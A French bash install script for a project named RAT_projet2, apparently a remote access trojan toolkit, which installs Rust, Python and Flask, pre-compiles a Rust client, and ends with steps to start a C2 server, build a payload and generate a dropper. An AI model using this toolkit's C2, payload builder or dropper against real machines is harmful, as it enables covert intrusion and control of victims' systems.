#!/usr/bin/env bash
# ============================================================
#  RAT_projet2 — Script d'installation complet
#  Usage : chmod +x install.sh && ./install.sh
# ============================================================
set -e

GREEN='\033[0;32m'; YELLOW='\033[1;33m'; RED='\033[0;31m'; NC='\033[0m'

info()    { echo -e "${GREEN}[✓]${NC} $*"; }
warn()    { echo -e "${YELLOW}[!]${NC} $*"; }
error()   { echo -e "${RED}[✗]${NC} $*"; exit 1; }
step()    { echo -e "\n${YELLOW}══════════════════════════════════════${NC}"; echo -e "${YELLOW}  $*${NC}"; echo -e "${YELLOW}══════════════════════════════════════${NC}"; }

# Toujours relatif à l'emplacement du script (pas de ~/Documents codé en dur)
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
WEB_DIR="$SCRIPT_DIR/web_manager"
RAT_DIR="$SCRIPT_DIR/RAT_projet-main/rat"

info "Dossier projet : $SCRIPT_DIR"

# ── Vérification OS ──────────────────────────────────────────
if ! command -v apt-get &>/dev/null; then
    error "Ce script nécessite un système Debian/Ubuntu/Kali (apt-get non trouvé)."
fi

# ── 1. Paquets système ───────────────────────────────────────
step "1/5 — Installation des paquets système"
sudo apt-get update -qq
sudo apt-get install -y -qq \
    curl git build-essential pkg-config \
    libssl-dev musl-tools openssl \
    python3 python3-pip &>/dev/null
info "Paquets système installés."

# ── 2. Rust + Cargo ─────────────────────────────────────────
step "2/5 — Installation de Rust"
if command -v cargo &>/dev/null; then
    info "Rust déjà installé ($(cargo --version))."
else
    warn "Rust non trouvé, installation en cours..."
    curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh -s -- -y --no-modify-path
    info "Rust installé."
fi

# Source cargo env pour s'assurer que cargo est accessible
if [ -f "$HOME/.cargo/env" ]; then
    source "$HOME/.cargo/env"
fi

if ! command -v cargo &>/dev/null; then
    error "cargo toujours introuvable. Exécute : source ~/.cargo/env  puis relance."
fi
info "cargo : $(cargo --version)"

# ── 3. Cibles Rust cross-compilation ────────────────────────
step "3/5 — Ajout des cibles Rust (cross-compilation)"
for target in "x86_64-unknown-linux-musl" "aarch64-unknown-linux-musl"; do
    if rustup target list --installed | grep -q "$target"; then
        info "Cible déjà installée : $target"
    else
        rustup target add "$target"
        info "Cible ajoutée : $target"
    fi
done

# ── 4. Dépendances Python ────────────────────────────────────
step "4/5 — Installation des dépendances Python"
REQ="$WEB_DIR/requirements.txt"
# Kali/Debian récents bloquent pip sans --break-system-packages
if [ -f "$REQ" ]; then
    pip3 install -q --break-system-packages -r "$REQ" 2>/dev/null \
        || pip3 install -q -r "$REQ"
else
    pip3 install -q --break-system-packages flask werkzeug 2>/dev/null \
        || pip3 install -q flask werkzeug
fi
info "Dépendances Python installées."

# ── 5. Pré-compilation du client Rust ───────────────────────
step "5/5 — Pré-compilation du client Rust"
if [ -d "$RAT_DIR" ]; then
    warn "Pré-compilation en cours (quelques minutes la 1ère fois)..."
    cd "$RAT_DIR"
    cargo build -p client --release -q \
        && info "Client Rust compilé." \
        || warn "Compilation échouée — tu pourras le faire depuis l'interface."
    cd "$SCRIPT_DIR"
else
    warn "Dossier $RAT_DIR non trouvé, étape ignorée."
fi

# ── Résumé ───────────────────────────────────────────────────
echo ""
echo -e "${GREEN}╔══════════════════════════════════════════════════╗${NC}"
echo -e "${GREEN}║   ✅  Installation terminée !                    ║${NC}"
echo -e "${GREEN}╚══════════════════════════════════════════════════╝${NC}"
echo ""
echo -e "  Lance le dashboard avec :"
echo -e "  ${YELLOW}cd \"$WEB_DIR\" && python3 app.py${NC}"
echo ""
echo -e "  Puis ouvre : ${GREEN}http://127.0.0.1:5000${NC}"
echo ""
echo -e "  Dans l'interface :"
echo -e "   1. ⚙️  Configuration → ${YELLOW}'Générer les clés & Configurer'${NC}"
echo -e "   2. C2 Server         → ${YELLOW}Start Server${NC}"
echo -e "   3. Agent Builder     → ${YELLOW}Build Payload${NC}"
echo -e "   4. File Binder       → ${YELLOW}Générer le Dropper${NC}"
echo ""
